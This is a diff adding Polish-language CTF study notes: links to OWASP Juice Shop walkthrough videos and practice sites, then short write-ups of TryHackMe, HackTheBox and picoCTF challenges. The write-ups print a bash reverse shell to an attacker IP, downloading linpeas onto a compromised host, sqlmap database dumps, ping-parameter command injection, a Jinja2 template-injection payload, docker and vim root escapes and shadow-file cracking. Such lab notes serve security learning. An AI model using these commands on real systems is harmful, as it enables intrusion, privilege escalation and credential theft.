@@ -3410,4 +3410,432 @@ słowami są:**
 • signed – Przedrostek umożliwiający definicję liczb dodatnich oraz ujemnych (standardowo)
 • unsigned – Przedrostek umożliwiający definicję liczb tylko dodatnich oraz zera.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-          
+
+# CTFY
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+OWASP JUICE SHOP:
+Zero Stars](https://youtu.be/0YSNRz0NRt8)
+* [★ Confidential Document](https://youtu.be/Yi7OiMtzGXc)
+* [★ DOM XSS](https://youtu.be/BuVxyBo05F8)
+* [★ Error Handling](https://youtu.be/WGafQnjSMk4)
+* [★ Missing Encoding](https://youtu.be/W7Bt2AmYtao)
+* [★ Outdated Allowlist](https://youtu.be/TEdZAXuTfpk)
+* [★ Privacy Policy](https://youtu.be/f5tM_4vBq-w)
+* [★ Repetitive Registration](https://youtu.be/mHjYOtKGYQM)
+* [★★ Login Admin](https://youtu.be/LuU1fSuc7Gg)
+* [★★ Admin Section](https://youtu.be/BPLhu354esc)
+* [★★ Classic Stored XSS](https://youtu.be/dxzU6djocJQ)
+* [★★ Deprecated Interface](https://youtu.be/yQ40B_eSj48)
+* [★★ Five Star Feedback](https://youtu.be/9BsfRJA_-ik)
+* [★★ Login MC SafeSearch](https://youtu.be/8VhGBdVK9ik)
+* [★★ Password Strength](https://youtu.be/fnuz-3QM8ac)
+* [★★ Security Policy](https://youtu.be/_h829JTNtKo)
+* [★★ View Basket](https://youtu.be/hBbdxn3-aiU)
+* [★★ Weird Crypto](https://youtu.be/GWJouiMUJno)
+* [★★★ API-Only XSS](https://youtu.be/aGjLR4uc0ys)
+* [★★★ Admin Registration](https://youtu.be/-H3Ngs-S0Ms)
+* [★★★ Björn's Favorite Pet](https://youtu.be/a0k465G8Zkc)
+* [★★★ Captcha Bypass](https://youtu.be/pgGVVOhIiaM)
+* [★★★ Client-side XSS Protection](https://youtu.be/bNjsjs0T0_k)
+* [★★★ Database Schema](https://youtu.be/0-D-e66U2Z0)
+* [★★★ Forged Feedback](https://youtu.be/99iKTSkZ814)
+* [★★★ Forged Review](https://youtu.be/k2abfhtuU9c)
+* [★★★ GDPR Data Erasure](https://youtu.be/zBTYSpp41u8)
+* [★★★ Login Amy](https://youtu.be/ICln3xcVxzI)
+* [★★★ Login Bender](https://youtu.be/a6kh9fL77A0)
+* [★★★ Login Jim](https://youtu.be/zJpJibswGWA)
+* [★★★ Manipluate Basket](https://youtu.be/pdtDtmIiSOQ)
+* [★★★ Payback Time](https://youtu.be/QN4f00VsXn4)
+* [★★★ Privacy Policy Inspection](https://youtu.be/5DUXTmp5KbI)
+* [★★★ Product Tampering](https://youtu.be/G4UKdotkyu8)
+* [★★★ Reset Jim's Password](https://youtu.be/qYVlxeKVhgA)
+* [★★★ Upload Size](https://youtu.be/5pcAPUihhWA)
+* [★★★ Upload Type](https://youtu.be/4FPyMdyVt2s)
+* [★★★★ Access Log (Sensitive Data Exposure)](https://youtu.be/RBTfGk-ZwnY)
+* [★★★★ Ephemeral Accountant (SQL-Injection)](https://youtu.be/rD-_fRDHf9o)
+* [★★★★ Expired Coupon (Improper Input Validation)](https://youtu.be/4cWTUdTvTZg)
+* [★★★★ Forgotten Developer Backup (Sensitive Data Exposure)](https://youtu.be/YvkuVZ6r2Rg)
+* [★★★★ Forgotten Sales Backup (Sensitive Data Exposure)](https://youtu.be/5g4WRASni6g)
+* [★★★★ GDPR Data Theft (Sensitive Data Exposure)](https://youtu.be/GPW90c4Ahbc)
+* [★★★★ Legacy Typosquatting (Vulnerable Components)](https://youtu.be/HqkGeWtwiHY)
+* [★★★★ Login Bjoern (Broken Authentication)](https://youtu.be/pmBJ1ZAlpF8)
+* [★★★★ Misplaced Signature File (Sensitive Data Exposure)](https://youtu.be/56qHiwxTjYY)
+* [★★★★ Nested Easter Egg (Cryptographic Issues)](https://youtu.be/yvatrnWvcGE)
+* [★★★★ NoSql Manipulation (Injection)](https://youtu.be/frymuDxKwmc)
+:broken_heart:
+* [★★★★★ Change Benders Password (Broken Authentication)](https://youtu.be/J3BSi-z9_7I)
+* [★★★★★ Extra Language (Broken Anti Automation)](https://youtu.be/KU2LzxABetk)
+* [Broken Authentication and SQL Injection - OWASP Juice Shop TryHackMe](https://youtu.be/W4MXUnZB2jc)
+by
+[Motasem Hamdan - CyberSecurity Trainer](https://www.youtube.com/channel/UCNSdU_1ehXtGclimTVckHmQ)
+* Live Hacking von Online-Shop „Juice Shop” (:de:)
+[Twitch live stream](https://www.twitch.tv/GregorBiswanger) recordings by
+[Gregor Biswanger](https://www.youtube.com/channel/UCGMA9qDbIQ-EhgLD-ZrsHWw)
+(🧃`v11.x`)
+* [Level 1](https://youtu.be/ccy-eKYpdbk)
+* [Level 2](https://youtu.be/KtMPEDJx0Sg)
+* [Level 3](https://youtu.be/aqXfFVHJ91g)
+* [Level 4](https://youtu.be/jfe-iEePlTc)
+* [HackerOne #h1-2004 Community Day: Intro to Web Hacking - OWASP Juice Shop](https://youtu.be/KmlwIwG7Kv4)
+by [Nahamsec](https://twitch.tv/nahamsec) including the creation of a
+(fake) bugbounty report for all findings (🧃`v10.x`)
+* [TryHackme - JuiceShop Walkthrough](https://youtu.be/3yYNvRVlKmo) by
+[Profesor Parno](https://www.youtube.com/channel/UCcBThq4OKjox_kfPkG1BF0Q)
+(🧃`v8.x`, 🇮🇩)
+* [OWASP Juice Shop All Challenges Solved || ETHIKERS](https://youtu.be/Fjdhf6OHgRk)
+full-spoiler, time-lapsed, no-commentary hacking trip (🧃`v8.x`)
+* [Hacking JavaScript - Intro to Hacking Web Apps (Episode 3)](https://youtu.be/ejB1i5n_d7o)
+by Arthur Kay (🧃`v8.x`)
+* [HackerSploit](https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q)
+Youtube channel (🧃`v7.x`)
+* [OWASP Juice Shop - SQL Injection](https://youtu.be/nH4r6xv-qGg)
+* [Web App Penetration Testing - #15 - HTTP Attributes (Cookie Stealing)](https://youtu.be/8s3ChNKU85Q)
+* [Web App Penetration Testing - #14 - Cookie Collection & Reverse Engineering](https://youtu.be/qtr0qtptYys)
+* [Web App Penetration Testing - #13 - CSRF (Cross Site Request Forgery)](https://youtu.be/TwG0Rd0hr18)
+* [How To Install OWASP Juice Shop](https://youtu.be/tvNKp1QXV_8)
+* [7 Minute Security](https://7ms.us) Podcast (🧃`v2.x`)
+* Episode #234:
+[7MS #234: Pentesting OWASP Juice Shop - Part 5](https://7ms.us/7ms-234-pentesting-owasp-juice-shop-part5/)
+([Youtube](https://www.youtube.com/watch?v=lGVAXCfFwv0))
+* Episode #233:
+[7MS #233: Pentesting OWASP Juice Shop - Part 4](https://7ms.us/7ms-233-pentesting-owasp-juice-shop-part-4/)
+([Youtube](https://www.youtube.com/watch?v=1hhd9EwX7h0))
+* Episode #232:
+[7MS #232: Pentesting OWASP Juice Shop - Part 3](https://7ms.us/7ms-232-pentesting-owasp-juice-shop-part-3/)
+([Youtube](https://www.youtube.com/watch?v=F8iRF2d-YzE))
+* Episode #231:
+[7MS #231: Pentesting OWASP Juice Shop - Part 2](https://7ms.us/7ms-231-pentesting-owasp-juice-shop-part-2/)
+([Youtube](https://www.youtube.com/watch?v=523l4Pzhimc))
+* Episode #230:
+[7MS #230: Pentesting OWASP Juice Shop - Part 1](https://7ms.us/7ms-230-pentesting-owasp-juice-shop-part-1/)
+([Youtube](https://www.youtube.com/watch?v=Cz37iejTsH4))
+* Episode #229:
+[7MS #229: Intro to Docker for Pentesters](https://7ms.us/7ms-229-intro-to-docker-for-pentesters/)
+([Youtube](https://youtu
+
+strings jakiśplik
+
+strony do nauki / ćwiczenia:
+https://ringzer0ctf.com/
+https://bugcrowd.com/
+https://blueteamlabs.online/
+https://cyberdefenders.org/
+**https://app.letsdefend.io/**
+
+https://0xrick.github.io/misc/c2/
+https://stackoverflow.com/
+https://breached.to/
+https://medium.com/mitre-attack
+https://tryharder.jorgetesta.tech/
+https://hunter.jorgetesta.tech/
+**https://learn.noxtal.com/**
+
+Jeśli umieścimy to na początku i umieścimy pojedyncze cudzysłowy wokół odwróconej powłoki z Reverse Shell, może to zadziałać.
+- bash -c 'bash -i >& /dev/tcp/MY IP/9001 0>&1'
+
+eskalacja uprawnień:
+- sudo python3 -m http.server 80
+- (na przejętej maszynie) wget http://MOJE IP/linpeas.sh
+- (na przejętej maszynie) sudo chmod +x linpeas.sh
+- (na przejętej maszynie) ./linpeas.sh
+- sudo bash
+- python3 -c 'import pty; pty.spawn("/bin/bash")'
+teraz mam roota
+
+https://www.vulnhub.com/resources/
+
+NMAP skanowaniwe - sudo nmap -sV -sC -A -O -T4 10.10.10.10
+
+## CYBORG:
+**łamanie Hashu**:  john hash.txt --wordlist=rockyou.txt
+
+**odtwarzanie kopi zapasowej za pomocą borgbackup**:
+- borg list nazwa foldera z kopią zapasową
+- mkdir test        #test to nazwa nowego foldera
+- borg mount nazwa foldera test
+- borg umount test              # rozmontowanie (usunięcie) archiwum
+
+**eskalacja uprawnień**:
+- chmod 777 /etc/mp3backups/backup.sh
+- echo "/bin/bash" > /etc/mp3backups/backup.sh
+- sudo /etc/mp3backups/backup.sh
+- cd /root
+
+
+## REVENGE
+ **strona ma na przykład /products czyli http://10.10.10.10/products i po wpisaniu /1 (http://10.10.10.10/products/1') wyskakuje error to znaczy że jest prawdopodobie podatna na SQL.**
+
+python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch --dbs
+
+**zrzucanie bazy danych** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWA tabeli --tables
+
+**zrzucenie kolejnej zawartości** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWATABELI -T NAZWA KOLEJNEJ TABELI --dump (jeżeli chcę sprawdzić inne to te same komendy tylko muszę zmienić nazy tabel)
+
+ODSZYFROWANIE HASHÓW -->  cd                                                                   Desktop
+john --wordlist=rockyou.txt PLIKZHASHAMI
+
+**SPRAWDZANIE UPRAWNIEŃ NA ZHAKOWANYM SERWERZE**: sudo -l
+
+ESKALACJA UPRAWNIEŃ:
+**jeżeli Użytkownik może edytować plik .service**:
+```
+sudoedit /etc/systemd/system/.service
+```
+wszystko usuwam i zostawiam tylko te komendy:![397a12abd70b704ce21cf3e883f705b0.png](:/b8a978f8f29e4f989e9dcca42913ddeb)
+POTEM TRZEBA WPISAĆ TE 2 KOMENDY:
+1. sudo systemctl daemon-reload
+2. sudo systemctl restart .service
+3. ls -lah /bin/bash
+4. /bin/bash -p
+5. id
+6. ls -lah /root
+7. zmiana nazwy zhakowanej strony --> nano /var/www/nazwastrony/templates/index.html ![41e10360e04b716ee139b1dcc208e7f0.png](:/751c19c0f689459883484c491cdae8f7)
+8. cd /root
+
+## UltraTech:
+
+**nmap scan** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.238.142 (otwarte porty; 21,22,8081,31331) 
+
+domeny działały jedynie na 10.10.238.142:31331 oraz :8081
+
+**dirbuster**  - znalazł /js w 10.10.238.142:31331 oraz /ping w :8081
+Ponieważ jest to usługa ping, zdecydowałem użyć parametru IP z adresem IP pętli zwrotnej http://10.10.238.14/ping?ip=127.0.0.1
+
+**EKSPLOATACJA**: http://10.10.213.191:8081/ping?ip='ls -la' 
+po tym zapytaniu otrzymałem baze danych - utech.db.sqlite
+
+**następnie wpisałem**: http://10.10.213.191:8081/ping?ip=`cat%20utech.db.sqlite`
+otrzymałem 2 hashe MD5 które odszyfrowałem
+
+(r00t to nazwa użytkownika)
+ŁĄCZENIE: ssh r00t@10.10.213.191 
+podałem hasło
+id
+
+*ESKALACJA UPRAWNIEŃ ZA POMOCĄ DOCKERA POSIADANEGO NA ZAATAKOWANEJ MASZYNIE**
+
+**KOMENDY** :docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
+docker ps -a 
+docker run -v /:/mnt --rm -it bash chroot /mnt sh 
+whoami 
+
+**prywatny klucz SSH**: cat /root/.ssh/id_rsa
+
+
+## BRUTE IT:
+**nmap** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.79.22
+
+**BRUTE FORCE ZA POMOCA BURP SUITE:** https://portswigger.net/support/using-burp-to-brute-force-a-login-page
+
+po złamaniu hasła zdobyłem prywatny klucz RSA: **wget http://MACHINE_IP/admin/panel/id_rsa**
+
+**DESZYFROWANIE**: /usr/share/john/ssh2john.py id_rsa > idrsa.txt
+john idrsa.txt --wordlist=rockyou.txt
+
+**ŁĄCZENIE**:  ssh john@MACHINE_IP -i id_rsa
+
+**ESKALACJA UPRAWNIEŃ:**  sudo -l 
+- Sprawdzanie w GTFObins, czy możemy wykorzystać /bin/cat, czy nie. Tak, /bin/cat można wykorzystać.
+- możemy uzyskać dostęp do /etc/shadow, który zawiera użytkowników systemu i hasła.
+- Utwórz plik o nazwie „hashes” i skopiuj zawartość pliku shadow w postaci skrótów i używając johna do złamania skrótów
+- john hashes --wordlist=rockyou.txt
+- su root
+- cd root
+
+
+Zawsze sprawdzaj:
+
+Kapitalizacja
+Kodowanie znaków
+Końcowe spacje/nowe wiersze
+Formaty daty/czasu
+Formaty adresów szesnastkowych (0x0042 vs 0042 vs 00000042)
+
+
+## CTF Wonderland
+
+Pierwsza flaga: Skan nmapem, pokazał port 22 SSH, po skanie dirbusterem znalazłem katalog r/a/b/b/i/t a w kodzie źrudłowym była nazwa i hasło (alice:pass) rzecz jasna było to logowanie do ssh bo nie było żadnego innego panelu czy możliwości, połączenie przez: **ssh alice@10.10.10.10** pierwsza flaga była przez tą komendę "cat /root/user.txt" a 2 w root.txt
+
+sudo -l <-- znalezienie że plik, ma uprawnienia  admina
+
+eskalacja uprawnień --> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+
+https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
+<--
+
+# hackthebox (python templates)
+
+po podpowiedzi czyli dokłądną wersję pythona i serwer, po wyszukaniu znalazałem artykuł o luce Server-Side Template Injection (SSTI) https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+wykorzystany exploit (w url po / ) --> `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
+i zamiast "id" mogę wpisać co chcę (po id zobaczyłem że jestem rootem) czyli wpisałem ls, znalazłem flagę .txt, i po prostu wpisałęm "cat flag.txt"
+
+|----------------------------------------------------------|
+## (zawsze używać komendy ls -la wtedy pokaże również ukryte foldery i pliki)
+|----------------------------------------------------------|
+
+## Git Happens (tryhackme)
+
+znaleziony directory .git
+
+użyłem narzędzia GitDumper
+
+**najpierw komenda w Dumperze**:  `./gitdumper.sh http://10.10.52.114/.git/ Clone`  
+(Clone to folder w którym są zapisane wyniki)
+
+**Potem Extractor**: .`/extractor.sh /home/kali/Desktop/Tools/GIT/GitTools/Dumper/Clone /home/kali/Desktop/Tools/GIT/GitTools/Extractor` 
+pierwsza lini to lokalizacji plików z wyniku dumpstera
+a 2 to tam gdzie ma zapisać wyniki
+
+Potem po przeszukaniu kilku folderów znalazłem hasło za pomocą tej komendy: `tail -n 20 index.html`
+(równie dobrze mogłem po prostu użyć komendy cat ale z 1 jest lepszy wynik)
+
+ctf - https://github.com/SamuraiWTF/samuraiwtf
+
+
+## Simple CTF
+
+znalezienie strony która była dostępna przez directory /simple
+
+strona używała podatnej wersji cms
+**(CVE-2019-9053)**
+
+przeróbiłem exploita z exploit-db z zwykłej wersji pythona na python3
+
+**uruchomiłem polecenie**: `python3 exploit.py -u http://10.10.213.147/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
+
+zdobyłem nazwe użytkownika i hasło. Dzięki którym zalogowałem się przez port 2222 (ssh) 
+komenda: `ssh user@10.10.10.10 -p 2222`
+
+znalazłem flagę usera
+
+zauważyłęm że mam uprawnienia: `/bin/bash/vim`
+
+wyszukałem vim na stronie: https://gtfobins.github.io/gtfobins/vim/
+
+**eskalacja uprawnień (z pomocą strony):**  komenda: `sudo vim -c ':!/bin/sh'`
+cd root
+i mam flagę
+
+-------------------------------------------------------------------------------
+## Pico CTF reverse enginnering
+## nazwa: bbbbloat
+
+1. cmod +x filename
+2. ./filename
+3. ltrace filename
+4. strace filename
+5. objdump -d filename
+6. file filename
+7. gdb filename
+8. włączam ghride > window > devined strings > klikam na whats my favorite number? czyli output programu (2 razy kliknąć w fud zeby zobaczyć inną funkcję) > wchodzę znowu w decompile i zmieniam nazwę z fud cośtam na main (po to że to prawdopodobnie główna funkcja) > jako iż nie ma żadnej innej funkcjie w tym kodzie jednie jaka jest moja ulubiona liczbą i to nie jest poprawne, to w kodzie widzę coś takiego: local_48 = 0x86187 więc wpisałem 'python3' a w nim wkleiłem to: 0x86187 oraz dostałem taką odp: `549255` po włączeniu programu i wklejeniu tego kodu, dostałem flagę.
+
+
+## nazwa: file-run2 / file-run1
+
+1. chmod +x filename
+2. ./filename #odpowiedź programu: Run this file with only one argument.
+3. treść ctfa brzmiała tak: "Another program, but this time, it seems to want some input. What happens if you try to run it on the command line with input "Hello!"?"
+4.  więc wpisałem ./run Hello! i dostałem flagę
+
+file run1 dokłądnie to samo ale bez wpisywania Hello!, wystarczyło samo włączenie programu
+
+## nazwa: GDB Test Drive
+
+w opisie odrazu było rozwiązanie, jedyne co musiałem zrobić to wpisać te komendy: 
+   
+- [ ]  `chmod +x gdbme`
+- [ ]  `gdb gdbme`
+- [ ] (gdb) `layout asm`
+- [ ] (gdb) `break *(main+99)`
+- [ ] (gdb) `run`
+- [ ] (gdb) `jump *(main+104)`
+
+## nazwa: patchme flag
+
+ctf zawierał zaszyfrowany plik i kod pythona ten: 
+
+```
+### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
+def str_xor(secret, key):
+    #extend key to secret length
+    new_key = key
+    i = 0
+    while len(new_key) < len(secret):
+        new_key = new_key + key[i]
+        i = (i + 1) % len(key)        
+    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
+###############################################################################
+
+
+flag_enc = open('flag.txt.enc', 'rb').read()
+
+
+
+def level_1_pw_check():
+    user_pw = input("Please enter correct password for flag: ")
+    if( user_pw == "ak98" + \
+                   "-=90" + \
+                   "adfjhgj321" + \
+                   "sleuth9000"):
+        print("Welcome back... your flag, user:")
+        decryption = str_xor(flag_enc.decode(), "utilitarian")
+        print(decryption)
+        return
+    print("That password is incorrect")
+
+
+
+level_1_pw_check()
+```
+
+po przeanalizowaniu kodu można zobaczyć że kod dekoduje zaszyfrowany plik któy ma flae (funkcja decryption = str_xor(flag_enc.decode)). wystarczy tylko wpisać hasło które widać w user_pw. po dodaniu wszystkiego razem wychodzi takie hasło: "ak98-=90adfjhgj321sleuth9000" po wpisaniu hasła w progamie mam flagę.
+
+
+
+## nazwa: findme
+
+użyłem burpsuite do zobaczenia parametrów po zalogowaniu się na konto było  przekierowanie: ""/next-page/id=cGljb0NURntwcm94aWVzX2Fs" po zobaczeniu kodu widziałem to:         
+``` setTimeout(function () {
+           // after 2 seconds
+           window.location = "/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==";
+        }, 0.5)
+```
+
+czyli po 2 sekundach przekierowuje dodirecotry /home. jednak jak można zonbaczyć po znakach == na końcu jest to zakodowane przez base64. więc po dodaniu pierwszej części i 2 wychodzi cośtakiego: cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==
+
+odszyforwałem to tą komendą i zobaczyłem flagę:
+`echo 'cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==' | base64 -d`
+
+## nazwa: unpackme
+
+to był plik .upx > więc go od pakowałem tym poleceniem: upx -d filename.upx
+
+nasępnie użyłem ghridy, i w wyszukiwarce po lewej stronie wyszukałem słowo "main"
+
+to jest częśc kodu tego main:  
+
+```
+local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  local_38 = 5509350891791333953;
+  local_30 = 0x30623e306b6d4146;
+  local_28 = 0x5f60643630486637;
+  local_20 = 0x37666132;
+  local_1c = 0x4e;
+  printf("What\'s my favorite number? ");
+  __isoc99_scanf(&DAT_004b3020,&local_44);
+  if (local_44 == 0xb83cb) {
+    local_40 = (char *)rotate_encrypt(0,&local_38);
+    fputs(local_40,(FILE *)stdout);
+    putchar(10);
+    free(local_40);
+  }
+  else {
+    puts("Sorry, that\'s not it!");
+  }
+```
+jak można po kodzie wywnieoskować trzeba było rozkodować"0xb83cb" odszyfrowałem to z użyciem komendy python3, wkleiłem hasło do programu i otrzymałem flagę.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
